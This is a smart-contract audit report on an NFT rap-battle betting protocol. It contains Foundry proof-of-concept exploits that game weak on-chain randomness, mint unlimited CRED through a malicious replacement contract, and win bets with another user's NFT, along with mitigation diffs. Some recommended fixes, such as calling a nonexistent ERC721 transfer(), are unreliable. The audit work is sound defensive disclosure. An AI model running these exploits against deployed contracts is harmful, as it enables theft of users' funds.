### [H-1] Weak randomness in `RapBattle::_battle()` allows the challenger to be the winner

**Description:** Hashing `msg.sender`, `block.timestamp` and `block.prevrandao` creates a predictable final number. It is not a good random number. Malicious users can manipulate theses values or know ahead of time to choose the winner rap battle themselves.

**Impact:** A challenger can choose to be the winner of the rap battle, winning the CRED every time.

**Proof of Concept:** Add the following to the `OneShotTest.t.sol` test suite.

<details>
<summary>Code</summary>

```javascript
    function test_weakRngBattle() public twoSkilledRappers {
        // User (defender) setup
        uint256 oldUserBalance = cred.balanceOf(user);
        console.log("Current user balance: ", oldUserBalance);
        uint256 userTokenId = 0;
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), userTokenId);
        cred.approve(address(rapBattle), 10);
        rapBattle.goOnStageOrBattle(userTokenId, 3);
        vm.stopPrank();

        // Challenger (attacker) setup
        uint256 oldChallengerBalance = cred.balanceOf(challenger);
        console.log("Current challenger balance: ", oldChallengerBalance);
        uint256 challengerTokenId = 1;
        uint256 defenderRapperSkill = rapBattle.getRapperSkill(userTokenId);
        uint256 challengerRapperSkill = rapBattle.getRapperSkill(challengerTokenId);
        uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;
        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, challenger))) % totalBattleSkill;
        for (random; random <= defenderRapperSkill;) {
            vm.warp(block.timestamp + 1);
            vm.roll(block.number + 1);
            random =
                uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, challenger))) % totalBattleSkill;
        }

        // from here, random is superior to defenderRapperSkill everytime
        vm.startPrank(challenger);
        oneShot.approve(address(rapBattle), challengerTokenId);
        cred.approve(address(rapBattle), 10);
        console.log("** FIGTH **");
        rapBattle.goOnStageOrBattle(challengerTokenId, 3);
        vm.stopPrank();

        uint256 newChallengerBalance = cred.balanceOf(challenger);
        uint256 newUserBalance = cred.balanceOf(user);
        console.log("New challenger balance: ", newChallengerBalance);
        console.log("New user balance: ", newUserBalance);

        assert(newChallengerBalance > oldChallengerBalance);
        assert(newUserBalance < oldUserBalance);
        assert(newChallengerBalance == (oldChallengerBalance + oldUserBalance - newUserBalance));
    }
```

</details>
<br>

<summary>Results: forge test --mt test_weakRngBattle -vv</summary>

```console
    Running 1 test for test/OneShotTest.t.sol:RapBattleTest
    [PASS] test_weakRngBattle() (gas: 645111)
    Logs:
        Current user balance:  4
        Current challenger balance:  4
        ** FIGTH **
        New challenger balance:  7
        New user balance:  1

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.13ms
```
<br>

**Recommended Mitigation:**  Consider using an oracle (off-chain data) for your randomness like [Chainlink VRF](https://docs.chain.link/vrf).

---

### [H-2] Ownership is centralized which leaves open for infinite minting and of CRED and maxed out `IOneShot::RapperStats` without staking.

**Description:** Both `OneShot` and `Credibility` contracts have the address that deployed the contract as an owner. The owner can use both `OneShot::setStreetsContract()` and `Credibility::setStreetsContract()` to replace the streetAddress contract by a malicious one.

**Impact:** If the owner adress is compromised, a malicious contract implementing `Streets` can mint an infinite amount of CRED and max out `IOneShot::RapperStats` without staking.

**Proof of Concept:** Add the following to the `OneShotTest.t.sol` test suite.

<details>
<summary>Code</summary>

```javascript
    contract StreetsAttack is Streets {
        error StreetsAttack__UnknownOwner();

        address immutable i_owner;

        constructor(address _oneShotContract, address _credibilityContract)
            Streets(_oneShotContract, _credibilityContract)
        {
            i_owner = msg.sender;
        }

        function motherLoad() external {
            uint256 currentBalance = credContract.totalSupply();
            credContract.mint(i_owner, type(uint256).max - currentBalance);
        }

        function hyperbolicTimeChamber(uint256 tokenId) external {
            if (oneShotContract.ownerOf(tokenId) != i_owner) {
                revert StreetsAttack__UnknownOwner();
            }

            IOneShot.RapperStats memory stakedRapperStats = oneShotContract.getRapperStats(tokenId);
            oneShotContract.updateRapperStats(tokenId, false, false, false, true, stakedRapperStats.battlesWon);
        }
    }

    contract RapBattleTest is Test {

        .
        .
        .

        function test_weakDecentralization() public {
            address attacker = makeAddr("attacker");
            vm.prank(attacker);
            StreetsAttack streetsAttack = new StreetsAttack(address(oneShot), address(cred));

            // Compromised owner address sets new street contract
            oneShot.setStreetsContract(address(streetsAttack));
            cred.setStreetsContract(address(streetsAttack));

            // Mint max amount of CRED
            uint256 oldAttackerCredBalance = cred.balanceOf(attacker);
            console.log("attacker balance: ", oldAttackerCredBalance);
            streetsAttack.motherLoad();
            uint256 newAttackerCredBalance = cred.balanceOf(attacker);
            console.log("New attacker balance:  ", newAttackerCredBalance);
            assert(oldAttackerCredBalance < newAttackerCredBalance);
            assert(cred.totalSupply() == type(uint256).max);

            // Max out RapperStats NFT in less than 4 days
            uint256 nftId = oneShot.getNextTokenId();
            console.log("attacker's NFT id:  ", nftId);
            vm.prank(attacker);
            oneShot.mintRapper();
            uint256 oldDate = block.timestamp;
            console.log("Time BEFORE stake:  ", oldDate);
            IOneShot.RapperStats memory oldStats = oneShot.getRapperStats(nftId);
            console.log("NFT weakKnees stat:  ", oldStats.weakKnees);
            console.log("NFT heavyArms stat:  ", oldStats.heavyArms);
            console.log("NFT spaghettiSweater stat:  ", oldStats.spaghettiSweater);
            console.log("NFT calmAndReady stat:  ", oldStats.calmAndReady);
            streetsAttack.hyperbolicTimeChamber(nftId);
            uint256 newDate = block.timestamp;
            console.log("Time AFTER stake:  ", newDate);
            IOneShot.RapperStats memory newStats = oneShot.getRapperStats(0);
            console.log("New NFT weakKnees stat:  ", newStats.weakKnees);
            console.log("New NFT heavyArms stat:  ", newStats.heavyArms);
            console.log("New NFT spaghettiSweater stat:  ", newStats.spaghettiSweater);
            console.log("New NFT calmAndReady stat:  ", newStats.calmAndReady);
            assert(oldDate == newDate);
            assert(
                oldStats.weakKnees != newStats.weakKnees && oldStats.heavyArms != newStats.heavyArms
                    && oldStats.spaghettiSweater != newStats.spaghettiSweater && oldStats.calmAndReady != newStats.calmAndReady
            );
        }
    }
```

</details>
<br>

<summary>Results: forge test --mt test_weakDecentralization -vv</summary>

```console
    Running 1 test for test/OneShotTest.t.sol:RapBattleTest
    [PASS] test_weakDecentralization() (gas: 870807)
    Logs:
        attacker balance:  0
        New attacker balance:   115792089237316195423570985008687907853269984665640564039457584007913129639935
        attacker's NFT id:   0
        Time BEFORE stake:   1
        NFT weakKnees stat:   true
        NFT heavyArms stat:   true
        NFT spaghettiSweater stat:   true
        NFT calmAndReady stat:   false
        Time AFTER stake:   1
        New NFT weakKnees stat:   false
        New NFT heavyArms stat:   false
        New NFT spaghettiSweater stat:   false
        New NFT calmAndReady stat:   true
    
    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.77ms
```
<br>

**Recommended Mitigation:**  Consider transfering ownership of `Credibility` and `OneShot` to `address(0)`.

---

### [M-1] `RapBattle::goOnStageOrBattle()` don't check if the challenger is the owner of the NFT, allowing someone else to claim the winning bet 

**Description:** `RapBattle::goOnStageOrBattle()` is missing a check for `msg.sender == oneShotNft.ownerOf(_tokenId)` to make sure an attacker is not rap batteling with an NFT belonging to someone else

**Impact:** This issue could allow a malicious user to claim the winning bet instead of the `OneShot` NFT owner

**Proof of Concept:** Add the following to the `OneShotTest.t.sol` test suite.

<details>
<summary>Code</summary>

```javascript
    function test_CanBattleWithSomeoneElseNft() public twoSkilledRappers {
        uint256 credBet = 3;
        // User (defender) setup
        uint256 oldUserBalance = cred.balanceOf(user);
        console.log("Current user balance: ", oldUserBalance);
        uint256 userTokenId = 0;
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), userTokenId);
        cred.approve(address(rapBattle), credBet);
        rapBattle.goOnStageOrBattle(userTokenId, credBet);
        vm.stopPrank();

        // Attacker setup
        address attacker = makeAddr("attacker");
        vm.prank(challenger);
        cred.transfer(attacker, credBet); // attacker has enough to match defender's bet
        uint256 oldAttackerBalance = cred.balanceOf(attacker);
        uint256 oldChallengerBalance = cred.balanceOf(challenger);
        console.log("Current attacker balance: ", oldAttackerBalance);
        console.log("Current challenger balance: ", oldChallengerBalance);
        uint256 challengerTokenId = 1;
        vm.prank(challenger); // Challenger allows attacker for reason X
        oneShot.approve(attacker, challengerTokenId);
        vm.startPrank(attacker);
        cred.approve(address(rapBattle), credBet);
        console.log("** FIGTH **");
        rapBattle.goOnStageOrBattle(challengerTokenId, credBet);
        vm.stopPrank();

        uint256 newUserBalance = cred.balanceOf(user);
        uint256 newAttackerBalance = cred.balanceOf(attacker);
        uint256 newChallengerBalance = cred.balanceOf(challenger);
        console.log("Current user balance: ", newUserBalance);
        console.log("Current attacker balance: ", newAttackerBalance);
        console.log("Current challenger balance: ", newChallengerBalance);

        assert(oldChallengerBalance == newChallengerBalance);
        assert(oldUserBalance > newUserBalance);
        assert(oldAttackerBalance < newAttackerBalance);
    }
```

</details>
<br>

<summary>Results: forge test --mt test_CanBattleWithSomeoneElseNft -vv</summary>

```console
    Running 1 test for test/OneShotTest.t.sol:RapBattleTest
    [PASS] test_CanBattleWithSomeoneElseNft() (gas: 665152)
    Logs:
    Current user balance:  4
    Current attacker balance:  3
    Current challenger balance:  1
    ** FIGTH **
    Current user balance:  1
    Current attacker balance:  6
    Current challenger balance:  1

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.61ms
```
<br>

**Recommended Mitigation:**

```diff
    function goOnStageOrBattle(uint256 _tokenId, uint256 _credBet) external {
+       require(msg.sender == oneShotNft.ownerOf(_tokenId), "RapBattle: Sender is not the owner of oneShotNft");
        if (defender == address(0)) {
            defender = msg.sender;
            defenderBet = _credBet;
            defenderTokenId = _tokenId;

            emit OnStage(msg.sender, _tokenId, _credBet);

            oneShotNft.transferFrom(msg.sender, address(this), _tokenId);
            credToken.transferFrom(msg.sender, address(this), _credBet);
        } else {
            // credToken.transferFrom(msg.sender, address(this), _credBet);
            _battle(_tokenId, _credBet);
        }
    }
```

---

### [G-1] `Streets::unstake()` mints 1 CRE token every day staked

**Description:** `Streets::unstake()` calls `Credibility::mint()` for every day the `OneShot` NFT was staked. It can be minted just once. 

**Recommended Mitigation:** 

```diff
    function unstake(uint256 tokenId) external {
        require(stakes[tokenId].owner == msg.sender, "Not the token owner");
        uint256 stakedDuration = block.timestamp - stakes[tokenId].startTime;
        uint256 daysStaked = stakedDuration / 1 days;

        // Assuming RapBattle contract has a function to update metadata properties
        IOneShot.RapperStats memory stakedRapperStats = oneShotContract.getRapperStats(tokenId);

        emit Unstaked(msg.sender, tokenId, stakedDuration);
        delete stakes[tokenId]; // Clear staking info

        // Apply changes based on the days staked
-       if (daysStaked >= 1) {
-           stakedRapperStats.weakKnees = false;
-           credContract.mint(msg.sender, 1);
-       }
-       if (daysStaked >= 2) {
-           stakedRapperStats.heavyArms = false;
-           credContract.mint(msg.sender, 1);
-       }
-       if (daysStaked >= 3) {
-           stakedRapperStats.spaghettiSweater = false;
-           credContract.mint(msg.sender, 1);
-       }
-       if (daysStaked >= 4) {
-           stakedRapperStats.calmAndReady = true;
-           credContract.mint(msg.sender, 1);
-       }

        // Only call the update function if the token was staked for at least one day
        if (daysStaked >= 1) {
+           stakedRapperStats.weakKnees = false;
+           if (daysStaked >= 2) {
+               stakedRapperStats.heavyArms = false;
+           }
+           if (daysStaked >= 3) {
+               stakedRapperStats.spaghettiSweater = false;
+           }
+           if (daysStaked >= 4) {
+               stakedRapperStats.calmAndReady = true;
+           }
+           credContract.mint(msg.sender, daysStaked);
            oneShotContract.updateRapperStats(
                tokenId,
                stakedRapperStats.battlesWon
                stakedRapperStats.weakKnees,
                stakedRapperStats.heavyArms,
                stakedRapperStats.spaghettiSweater,
                stakedRapperStats.calmAndReady,
                stakedRapperStats.battlesWon
            );
        }

        // Continue with unstaking logic (e.g., transferring the token back to the owner)
        oneShotContract.transferFrom(address(this), msg.sender, tokenId);
    }
```

---

### [G-2] `Streets` implements `IERC721Receiver`

**Description:** `ERC721::onERC721Received()` is called when `ERC721::safeTransfer()`, `ERC721::safeTransferFrom()` or `ERC721::_safeMint()` are called. `Streets` doesn't need to implement `IERC721Receiver` in the first place since it never calls a function in `IOneShot` and `Credibility` contracts that calls `ERC721` safe functions.

**Recommended Mitigation:** 

```diff
-    import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
-   contract Streets is IERC721Receiver {
+   contract Streets {
        
    .
    .
    .

-   function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
-       return IERC721Receiver.onERC721Received.selector;
-   }

    }
```

---

### [I-1] `Streets::unstake()` is calling `ERC721::transferFrom()` instead of `ERC721::transfer()`

**Recommended Mitigation:** 

```diff
    function unstake(uint256 tokenId) external {
        require(stakes[tokenId].owner == msg.sender, "Not the token owner");
        uint256 stakedDuration = block.timestamp - stakes[tokenId].startTime;
        uint256 daysStaked = stakedDuration / 1 days;

        // Assuming RapBattle contract has a function to update metadata properties
        IOneShot.RapperStats memory stakedRapperStats = oneShotContract.getRapperStats(tokenId);

        emit Unstaked(msg.sender, tokenId, stakedDuration);
        delete stakes[tokenId]; // Clear staking info

        // Apply changes based on the days staked
        if (daysStaked >= 1) {
            stakedRapperStats.weakKnees = false;
            credContract.mint(msg.sender, 1);
        }
        if (daysStaked >= 2) {
            stakedRapperStats.heavyArms = false;
            credContract.mint(msg.sender, 1);
        }
        if (daysStaked >= 3) {
            stakedRapperStats.spaghettiSweater = false;
            credContract.mint(msg.sender, 1);
        }
        if (daysStaked >= 4) {
            stakedRapperStats.calmAndReady = true;
            credContract.mint(msg.sender, 1);
        }

        // Only call the update function if the token was staked for at least one day
        if (daysStaked >= 1) {
            oneShotContract.updateRapperStats(
                tokenId,
                stakedRapperStats.battlesWon
                stakedRapperStats.weakKnees,
                stakedRapperStats.heavyArms,
                stakedRapperStats.spaghettiSweater,
                stakedRapperStats.calmAndReady,
                stakedRapperStats.battlesWon
            );
        }

        // Continue with unstaking logic (e.g., transferring the token back to the owner)
-       oneShotContract.transferFrom(address(this), msg.sender, tokenId);
+       oneShotContract.transfer(msg.sender, tokenId);
    }
```

---

### [I-2] Wrong comment in `Streets::unstake()`

**Description:** `Rapbattle` doesn't implement a function called `updateRapperStats()`, furthermore `Streets::oneShotContract` is type `IOneShot`.

**Recommended Mitigation:** 

```diff
    function unstake(uint256 tokenId) external {
        require(stakes[tokenId].owner == msg.sender, "Not the token owner");
        uint256 stakedDuration = block.timestamp - stakes[tokenId].startTime;
        uint256 daysStaked = stakedDuration / 1 days;

-       // Assuming RapBattle contract has a function to update metadata properties
+       // Assuming IOneShot contract has a function to update metadata properties

        .
        .
        .
    }
```

---

### [I-3] `RapBattle::goOnStageOrBattle()` has old comment that should be removed

**Description:** `RapBattle::goOnStageOrBattle()` has a line of code that was commented.

**Recommended Mitigation:** 

```diff
    function goOnStageOrBattle(uint256 _tokenId, uint256 _credBet) external {
        if (defender == address(0)) {
            defender = msg.sender;
            defenderBet = _credBet;
            defenderTokenId = _tokenId;

            emit OnStage(msg.sender, _tokenId, _credBet);

            oneShotNft.transferFrom(msg.sender, address(this), _tokenId);
            credToken.transferFrom(msg.sender, address(this), _credBet);
        } else {
-           // credToken.transferFrom(msg.sender, address(this), _credBet);
            _battle(_tokenId, _credBet);
        }
    }
```

---

### [I-4] `RapBattle::goOnStageOrBattle()` allows to bet 0 CRED

**Description:** `RapBattle::goOnStageOrBattle()` does not check if `_credBet` is more than 0. A bet of 0 only end up spending gas for users without reward at the end wich defeats the purpose of rap battle betting

**Recommended Mitigation:** 

```diff
    function goOnStageOrBattle(uint256 _tokenId, uint256 _credBet) external {
        if (defender == address(0)) {
+           require(_credBet > 0, "RapBattle: Bet amounts is 0");
            defender = msg.sender;
            defenderBet = _credBet;
            defenderTokenId = _tokenId;

            emit OnStage(msg.sender, _tokenId, _credBet);

            oneShotNft.transferFrom(msg.sender, address(this), _tokenId);
            credToken.transferFrom(msg.sender, address(this), _credBet);
        } else {
            // credToken.transferFrom(msg.sender, address(this), _credBet);
            _battle(_tokenId, _credBet);
        }
    }
```

---